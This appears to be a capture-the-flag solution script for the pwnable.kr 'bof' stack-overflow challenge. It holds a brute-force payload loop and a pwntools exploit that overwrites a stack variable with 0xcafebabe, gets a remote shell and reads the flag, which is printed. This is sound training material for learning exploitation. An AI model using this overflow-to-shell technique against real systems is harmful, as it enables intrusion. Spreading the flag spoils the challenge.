import subprocess

'''
payload = b'A' * 32 + b'B' * 4

key = struct.pack('<I', 0xcafebabe)

payload += key
print(payload)

returned:
*** stack smashing detected ***: /home/bof/bof terminated
overflow me : 
Nah..

Some protection is in place
'''
# Welp, that didn't seem to work, maybe a forced entry would?
'''
program_command = ['nc', 'pwnable.kr', '9000']

for i in range(32, 100):
    print('Trying ' + str(i))
    
    payload = (i * 'A') + '\xBE\xBA\xFE\xCA'
    print(payload)
    proc = subprocess.Popen(program_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate(input=payload, timeout=10)
    print(stdout.decode('utf-8'))
    
    if "Nah" not in stdout.decode('utf-8'):
        print("hit")
        try:
            cat_proc = subprocess.run(['cat', './flag'], capture_output=True, text=True)
            print("Flag found:", cat_proc.stdout)
            print(f"Payload: {payload}")
        except Exception as e:
            print("Error reading flag:", e)
        break
'''

# It cracks it on the 52nd try, but doesnt want to keep the connection open, so lets try using pwntools:
from pwn import *

# context.log_level = 'debug'

conn = remote('pwnable.kr', 9000)
conn.send('A'*52+'\xbe\xba\xfe\xca')
# conn.close
# Lets make it interactive since it didnt say Nahh
conn.interactive()
# And boom, we got it:
'''
$ ls
bof
bof.c
flag
log
super.pl
$ cat flag
daddy, I just pwned a buFFer :)
$  
'''
